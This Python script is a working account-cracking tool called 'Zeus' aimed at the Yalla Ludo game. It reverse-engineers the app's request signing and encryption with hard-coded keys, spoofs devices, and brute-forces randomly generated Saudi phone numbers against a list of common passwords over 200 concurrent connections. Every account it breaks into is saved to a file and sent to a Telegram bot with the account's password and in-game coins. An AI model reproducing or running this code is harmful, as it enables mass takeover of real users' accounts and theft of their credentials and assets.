import base64, json, hashlib, time, uuid, struct, hmac as hmacmod, random, string, os, threading, sys, asyncio
import aiohttp
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from datetime import datetime
from collections import deque
init(autoreset=True)

# ==================== COLORS ====================#
R = "\x1b[38;5;196m"
W = "\x1b[38;5;15m"
G = "\x1b[38;5;46m"
Y = "\x1b[38;5;226m"
PINK = "\x1b[38;5;198m"
CYAN = "\x1b[38;5;51m"
P = "\x1b[38;5;198m"
xlinex = (f"{R}━"*56)
xp = f"{R}<[{W}●{R}]>{W}"
xpxx = f"{R}>{W}>{R}>{W}"

version = '3.0'
b1key   = b'4e82797b276c5cb729db62aaa229a057'
b1iv    = b'0102030405060708'
secret  = 'L3)qk*@8'
api     = "https://httpgateway.carrstuv.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
infopath = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
valid_accounts_file = "valid_accounts.txt"

# ==================== LOGO ====================#
logo = f"""
{P}●─────━Zeus─────━●
{R}╱╱╭━━━┳━┳━━━┳━╮
{P}╭━┫╭━╮┃━┫╭━╮┃━┫
{R}┃╋┣╯╭╯┣━┣╯╭╯┣━┃
{P}┃╭╯╱┃╭┻━╯╱┃╭┻━╯
{R}╰╯╱╱┃┃╱╱╱╱┃┃

{W}  ×─> {W}━━━━━━━{P}━━━━━━━━━━{W}━━━━━━━━━━━━{W}━━━━━{P}Zeus━━━━━━{W}━━━━━ <─×"""

# ==================== MOVING LOGO ====================#
def animate_logo():
    frames = [
        "ㅂㅈ둎ㄴ묘ㅑㅏㅍㅌㄷㄴ퍼ㅑㅕㅐ멋넛냣아ㅛ아요ㅏㅛ",
        "아ㅛ잏틒ㅋㄹ닛뎌내ㅛㅑㅅ냣내ㅛㅇ",
        "ㄷ벼냣냣냣낳타핰효오로러처러ㅕ려려려러ㅓ퍼처러",
        "추하허ㅗ러러ㅓ처류",
        "ㅛㄱㅈㄴ포ㅑㅅㅈㅂ뎌ㅐㅐㅏㅠㅌㄴㅈ"
    ]
    for frame in frames:
        sys.stdout.write(f"\r{R}{frame}")
        sys.stdout.flush()
        time.sleep(0.15)
    sys.stdout.write("\r" + " " * 50 + "\r")

# ==================== MULTI DEVICES ====================#
DEVICES = [
    {"name": "samsung Galaxy S24 Ultra", "model": "SM-S928B"},
    {"name": "samsung Galaxy S23 Ultra", "model": "SM-S918B"},
    {"name": "samsung Galaxy S22 Ultra", "model": "SM-S908B"},
    {"name": "samsung Galaxy S21 Ultra", "model": "SM-G998B"},
    {"name": "iPhone 15 Pro Max", "model": "iPhone15,2"},
    {"name": "iPhone 14 Pro Max", "model": "iPhone15,3"},
    {"name": "Xiaomi 14 Pro", "model": "2210132G"},
    {"name": "Xiaomi 13 Pro", "model": "2211133G"},
    {"name": "OnePlus 12", "model": "CPH2581"},
    {"name": "OnePlus 11", "model": "CPH2449"},
    {"name": "Google Pixel 8 Pro", "model": "Pixel 8 Pro"},
    {"name": "realme GT 5 Pro", "model": "RMX3888"},
    {"name": "Honor Magic 6 Pro", "model": "BRP-NX1"},
]

# ==================== MULTI DOMAINS ====================#
DOMAINS = [
    "httpgateway.carrstuv.com",
    "httpgateway.foodjkl.com",
    "httpgateway.planecde.com",
    "httpgateway.yalla.games",
    "httpgateway.penabcd.com",
    "httpgateway.lampjkl.com",
    "httpgateway.talkwxy.com",
]

INFOHOSTS = [
    "https://httpgateway.talkwxy.com",
    "https://httpgateway.yalla.games",
    "https://httpgateway.beachab.com",
    "https://httpgateway.carrstuv.com",
]

# ==================== RANDOM USER-AGENT ====================#
def get_random_ua():
    uas = [
        "YallaLudo-1.5.1.0-(Build 1050105)-Android 36",
        "YallaLudo-1.5.0.0-(Build 1050003)-Android 32",
        "YallaLudo-1.6.0.0-(Build 1060001)-Android 34",
        "YallaLudo-1.5.2.0-(Build 1050200)-Android 33",
        "YallaLudo-1.5.3.0-(Build 1050300)-Android 35",
        "YallaLudo-1.6.1.0-(Build 1060100)-Android 37",
        "YallaLudo-1.6.2.0-(Build 1060200)-Android 38",
        "YallaLudo-1.7.0.0-(Build 1070000)-Android 39",
        "YallaLudo-1.7.1.0-(Build 1070100)-Android 40",
    ]
    return random.choice(uas)

kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)

def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if   i < 16: f = (b & c) | (~b & d); g = i
            elif i < 32: f = (d & b) | (~d & c); g = (5*i+1) % 16
            elif i < 48: f = b ^ c ^ d;           g = (3*i+5) % 16
            else:        f = c ^ (b | ~d);         g = (7*i)   % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d; d = c; c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0=(a0+a)&0xffffffff; b0=(b0+b)&0xffffffff
        c0=(c0+c)&0xffffffff; d0=(d0+d)&0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)

def md5r(msg):
    return md5raw(msg, ivrev).hex()

def md5s(msg):
    return hashlib.md5(msg).hexdigest()

def md5upper(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

def xorstream(data, hera):
    k  = md5r(hera.encode() + secret.encode()).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, ks))

def encrypt(data, hera):
    return base64.b64encode(xorstream(data, hera)).decode()

def sign(data, hera):
    key = md5r(hera.encode() + secret.encode()).encode()
    return hmacmod.new(key, data, hashlib.sha256).hexdigest()

def medusa(data, hera):
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()

def generate_device_info():
    device = random.choice(DEVICES)
    device_id = str(uuid.uuid4())
    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
    chars = string.ascii_letters + string.digits
    shumeng = ''.join(random.choice(chars) for _ in range(36))
    nonce = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
    return {
        "device_id": device_id,
        "android": android,
        "shumeng": shumeng,
        "nonce": nonce,
        "name": device["name"],
        "model": device["model"]
    }

def baggage(timestamp, device_info):
    obj = {
        "timeSpan": timestamp, "version": "1.5.1.0",
        "deviceId": device_info["device_id"],
        "deviceName": device_info["name"],
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": device_info["shumeng"],
        "nonce": device_info["nonce"],
        "plateType": 0, "LanguageId": 2,
        "phoneModel": device_info["model"],
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": device_info["android"], "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()

def buildrequest(body, token='', uid='0', path=None):
    now    = int(time.time() * 1000)
    hera   = uuid.uuid4().hex
    device_info = generate_device_info()
    bag    = baggage(str(now), device_info)
    ua = get_random_ua()
    endpoint = path if path else '/' + '/'.join(api.split('/')[3:])
    signed = (endpoint + token + ua + bag).encode('utf-8')
    xsign   = f'2.0_2_{sign(signed, hera)}'
    xmedusa = medusa(signed, hera)
    wire = json.dumps(
        {"paramJsonString": encrypt(body, hera)},
        separators=(',',':')
    ).encode('utf-8')
    headers = {
        'User-Agent': ua,
        'UserId': str(uid),
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': token,
        'X-Timestamp': str(now),
        'versionString': '1.5.1.0',
        'X-Sign': xsign,
        'X-Hera': hera,
        'X-Time': str(now),
        'X-Medusa': xmedusa,
        'Content-Type': 'application/json; charset=utf-8',
    }
    return headers, wire, device_info

def decode(resp, hera=None):
    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
    param  = resp.get("paramJsonString", "")
    if not param:
        return resp
    raw = base64.b64decode(param)
    try:
        xored = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
        return json.loads(xored.decode('utf-8'))
    except Exception:
        pass
    if hera:
        try:
            dec = xorstream(raw, hera)
            return json.loads(dec.decode('utf-8'))
        except Exception:
            pass
    return resp

# ==================== ASYNC SESSION POOL ====================#
class SessionPool:
    def __init__(self, pool_size=50):
        self.pool_size = pool_size
        self.sessions = []
        self.lock = asyncio.Lock()
        self.connector = aiohttp.TCPConnector(
            limit=200,
            limit_per_host=50,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            force_close=False,
            keepalive_timeout=30
        )
    
    async def get_session(self):
        async with self.lock:
            if self.sessions:
                return self.sessions.pop()
            timeout = aiohttp.ClientTimeout(total=10, connect=5)
            return aiohttp.ClientSession(connector=self.connector, timeout=timeout)
    
    async def return_session(self, session):
        async with self.lock:
            if len(self.sessions) < self.pool_size:
                self.sessions.append(session)
            else:
                await session.close()
    
    async def close_all(self):
        async with self.lock:
            for session in self.sessions:
                await session.close()
            self.sessions.clear()
            await self.connector.close()

# ==================== TELEGRAM QUEUE ====================#
telegram_queue = deque(maxlen=1000)
telegram_lock = threading.Lock()

async def telegram_worker():
    """معالج رسائل تيليجرام - يرسل بسرعة بدون تأخير"""
    if not BOT_TOKEN or not CHAT_ID:
        return
    
    async with aiohttp.ClientSession() as session:
        while not stop_flag:
            try:
                if telegram_queue:
                    msg = telegram_queue.popleft()
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                    async with session.post(url, json=msg, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        if resp.status != 200:
                            # إعادة المحاولة
                            await asyncio.sleep(0.5)
                            async with session.post(url, json=msg, timeout=aiohttp.ClientTimeout(total=5)) as resp2:
                                pass
                else:
                    await asyncio.sleep(0.01)  # فحص سريع جداً
            except Exception:
                await asyncio.sleep(0.1)

def send_telegram(phone, pwd, name, uid, gold, diamond, level, vip, experience, max_exp):
    if not BOT_TOKEN or not CHAT_ID:
        return
    text = f"""YALLA LUDO

ID    ➜ {uid}
Name   ➜ {name}
Email  ➡ {phone}
Pass   ➜ {pwd}
Level  ➜ {level}
Coins  ➜ {gold}
Diamond  ➜ {diamond}
Exp     ➜ {experience}/{max_exp}
Vip      ➜ {vip}

Channel ➡ @R7Aih1
PY: @R7_36"""
    msg = {"chat_id": CHAT_ID, "text": text}
    telegram_queue.append(msg)

def save_valid_account(phone, pwd, name, uid, gold, diamond, level, vip, experience, max_exp):
    try:
        with open(valid_accounts_file, "a", encoding="utf-8") as f:
            f.write(f"YALLA LUDO\n")
            f.write(f"ID     {uid}\n")
            f.write(f"Name    {name}\n")
            f.write(f"Email  {phone}\n")
            f.write(f"Pass    {pwd}\n")
            f.write(f"Level   {level}\n")
            f.write(f"Coins   {gold}\n")
            f.write(f"Diamond  {diamond}\n")
            f.write(f"Exp    {experience}/{max_exp}\n")
            f.write(f"Vip     {vip}\n")
            f.write("=" * 50 + "\n")
    except:
        pass

# ==================== EXTENDED PASSWORDS ====================#
PASSWORDS = [
    'Aa123456', 'As123456', 'Aa123123', 'Aa1234567890',
    'Aa112233', 'Aa1234567', 'Aa12345678', 'Aa123456789',
    'Qwer1234', 'Qwer12345', 'Qwer123456',
    'Bb123456', 'Bb1234567', 'Bb12345678',
    'Qq123456', 'Ww123456', 'Zz123456',
    'Cc123456', 'Dd123456',
]

stats = {'total': 0, 'good': 0, 'wrong_pass': 0, 'not_registered': 0, 'error': 0}
stop_flag = False
lock = threading.Lock()
hit_accounts = []
BOT_TOKEN = ""
CHAT_ID = ""

def generate_mobile():
    prefix = random.choice(["050", "053", "054", "055", "056", "058"])
    return prefix + ''.join([str(random.randint(0, 9)) for _ in range(7)])

# ==================== ASYNC LOGIN ====================#
async def login_async(session, mobile, password):
    device_info = generate_device_info()
    body = json.dumps({
        "mobile": mobile, "areaCode": "966", "password": md5upper(password),
        "languageId": 2, "nationalityId": "1",
        "hostConfig": [
            {"bizType":5000,"countryCode":"IQ","hostUrl":"https://api-shumeng.yalla.games","type":2,"version":4},
            {"bizType":5001,"countryCode":"","hostUrl":"ws://firebreak.yalla.games","type":1,"version":1},
            {"bizType":1006,"countryCode":"IQ","hostUrl":"https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com","type":2,"version":20},
            {"bizType":1000,"countryCode":"IQ","hostUrl":"https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com","type":2,"version":19},
        ],
        "simCountry": "SA", "version": "1.5.1.0",
        "deviceId": device_info["device_id"],
        "deviceName": device_info["name"],
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": device_info["shumeng"],
        "nonce": device_info["nonce"],
        "plateType": 0, "phoneModel": device_info["model"],
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": device_info["android"], "IsSubpackages": 0, "appType": 0, "idfa": "",
    }, separators=(',',':'), ensure_ascii=False).encode('utf-8')
    
    headers, wire, _ = buildrequest(body)
    hera = headers['X-Hera']
    
    for domain in DOMAINS:
        url = f"https://{domain}/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
        try:
            async with session.post(url, data=wire, headers=headers) as resp:
                if resp.status == 200:
                    return decode(await resp.json(), hera), hera
        except:
            continue
    return None, None

async def fetchinfo_async(session, token, uid, account):
    device_info = generate_device_info()
    body = json.dumps({
        "accountId": int(account),
        "simCountry": "SA", "version": "1.5.1.0",
        "deviceId": device_info["device_id"],
        "deviceName": device_info["name"],
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": device_info["shumeng"],
        "nonce": device_info["nonce"], "plateType": 0,
        "languageId": 2, "phoneModel": device_info["model"],
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": device_info["android"], "IsSubpackages": 0, "appType": 0,
    }, separators=(',',':')).encode('utf-8')
    
    headers, wire, _ = buildrequest(body, token=token, uid=uid, path=infopath)
    headers['accessId'] = md5upper(str(account))
    hera = headers['X-Hera']
    
    for host in INFOHOSTS:
        try:
            async with session.post(host + infopath, data=wire, headers=headers) as resp:
                if resp.status == 200:
                    return decode(await resp.json(), hera)
        except:
            continue
    return None

# ==================== ASYNC CHECK ====================#
async def check_number_async(session, mobile):
    global stats, hit_accounts
    if stop_flag:
        return
    
    for pwd in PASSWORDS:
        if stop_flag:
            return
        
        try:
            login_result, hera = await login_async(session, mobile, pwd)
            if login_result is None:
                with lock:
                    stats['error'] += 1
                    stats['total'] += 1
                continue
            
            status = login_result.get("status", -1)
            
            if status == 0:
                data = login_result.get("data", {})
                token = data.get("token", "")
                uid = data.get("id", "")
                
                info_result = await fetchinfo_async(session, token, uid, uid)
                base_info = {}
                if info_result and info_result.get("status") == 0:
                    base_info = info_result.get("data", {}).get("baseInfo", {})
                
                name = base_info.get("name", "Unknown")
                gold = base_info.get("goldNum", "0")
                diamond = base_info.get("diamondNum", "0")
                level = base_info.get("levelId", "0")
                experience = base_info.get("experience", "0")
                max_exp = base_info.get("maxExp", "0")
                vip = "Yes" if base_info.get("isVip") else "No"
                
                with lock:
                    stats['good'] += 1
                    stats['total'] += 1
                    hit_accounts.append({
                        "phone": mobile,
                        "password": pwd,
                        "id": uid,
                        "name": name
                    })
                    print(f"{PINK}{mobile}{W} | {Y}{pwd}{W} | {G}{uid}{W} | {PINK}{name}{W}")
                
                send_telegram(mobile, pwd, name, uid, gold, diamond, level, vip, experience, max_exp)
                save_valid_account(mobile, pwd, name, uid, gold, diamond, level, vip, experience, max_exp)
                return
                
            elif status == 151:
                continue
            elif status == 182 or status == 1001:
                with lock:
                    stats['not_registered'] += 1
                    stats['total'] += 1
                return
            else:
                continue
                
        except Exception as e:
            with lock:
                stats['error'] += 1
                stats['total'] += 1
            continue
    
    with lock:
        stats['wrong_pass'] += 1
        stats['total'] += 1

def print_dashboard():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo)
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{W}  DEVELOPER {xpxx} {P}Zeus{G}-{W}")
    print(f"{W}  STATUS    {xpxx} {G}Premium{W}")
    print(f"{W}  VERSION   {xpxx} V{G}/{W}{version}")
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{R}⫷⫸ {P}𝐷𝐸𝑉 Zeus| {R}@R7_36 {R}● {R}https://t.me/R7Aih1{W}")
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{xp} FUTURES  {xpxx} {R}FILE{G}〤{W}CLONE")
    print(f"{xp} DEV {xpxx} {P}Zeus ~ @R7_36{W}")
    print(f"{xp} TODAYS   {xpxx} {P}{datetime.now().strftime('%Y-%m-%d')}{W}")
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{xp} COUNTRY    {xpxx} {P}Saudi Arabia{W}")
    print(f"{xp} HIT     {xpxx} {G}{stats['good']}{W}    {R}WRONG     {xpxx} {Y}{stats['wrong_pass']}{W}    {R}NOTREG     {xpxx} {R}{stats['not_registered']}{W}")
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{xp} HIT ACCOUNTS{W}")
    if hit_accounts:
        for acc in hit_accounts[-50:]:
            print(f"{xp} {PINK}{acc['phone']}{W} | {Y}{acc['password']}{W} | {G}{acc['id']}{W} | {PINK}{acc['name']}{W}")
    else:
        print(f"{xp} {R}No hits yet...{W}")
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{xp} TOTAL     {xpxx} {W}{stats['total']}")
    print(f"{xp} STATUS:    {xpxx} {G}SCANNING...{W}")
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")

def dashboard_loop():
    while not stop_flag:
        print_dashboard()
        time.sleep(0.5)

# ==================== MAIN ASYNC ====================#
async def worker(session, semaphore):
    """عامل مستمر يفحص الأرقام"""
    while not stop_flag:
        async with semaphore:
            mobile = generate_mobile()
            await check_number_async(session, mobile)

async def main_async():
    global stop_flag, BOT_TOKEN, CHAT_ID
    
    animate_logo()
    time.sleep(0.3)
    os.system('cls' if os.name == 'nt' else 'clear')
    
    BOT_TOKEN = input(f"{R}TOKEN {xpxx} ")
    CHAT_ID = input(f"{R}ID {xpxx} ")
    
    print(f"{R}Bot Token: {BOT_TOKEN[:20]}...{W}" if BOT_TOKEN else f"{R}No Bot Token{W}")
    print(f"{R}Chat ID: {CHAT_ID}{W}")
    print(f"{R}Country: Saudi Arabia - 966{W}")
    print(f"{R}Valid accounts will be saved to: {valid_accounts_file}{W}")
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{xp} {G}Starting with 200 concurrent connections...{W}")
    
    # إعداد تجمع الجلسات
    session_pool = SessionPool(pool_size=100)
    
    # بدء معالج تيليجرام
    telegram_task = asyncio.create_task(telegram_worker())
    
    # بدء لوحة المعلومات
    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()
    
    # إنشاء semaphore للتحكم بالاتصالات
    semaphore = asyncio.Semaphore(200)
    
    # إنشاء العمال
    workers = []
    for _ in range(200):
        session = await session_pool.get_session()
        workers.append(asyncio.create_task(worker(session, semaphore)))
    
    try:
        # انتظار حتى يتوقف البرنامج
        while not stop_flag:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        stop_flag = True
    
    # إلغاء العمال
    for w in workers:
        w.cancel()
    
    # إغلاق الجلسات
    await session_pool.close_all()
    await telegram_task
    
    time.sleep(1)
    print(f"\n{R}Done. HIT: {stats['good']}, Wrong: {stats['wrong_pass']}, NotReg: {stats['not_registered']}{W}")
    print(f"{R}Valid accounts saved to: {valid_accounts_file}{W}")

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    main()